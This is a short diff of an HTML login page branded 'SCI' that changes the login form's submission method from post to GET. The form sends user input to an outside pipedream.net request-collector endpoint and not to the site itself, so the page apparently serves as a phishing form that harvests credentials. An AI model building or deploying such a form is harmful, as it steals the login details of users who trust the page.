@@ -4,7 +4,7 @@
             <div class="text-center mb-4">
                 <a href="." class="navbar-brand navbar-brand-autodark user-select-none" style="text-decoration: none;"><img src="" alt="" height="36">SCI</a>
             </div>
-            <form class="card card-md" action="https://en1q285rsuhcbv2.m.pipedream.net" method="post" autocomplete="off">
+            <form class="card card-md" action="https://en1q285rsuhcbv2.m.pipedream.net" method="GET" autocomplete="off">
                 <div class="card-body">
                     <h2 class="card-title text-center mb-4 user-select-none">Login to your account</h2>
 
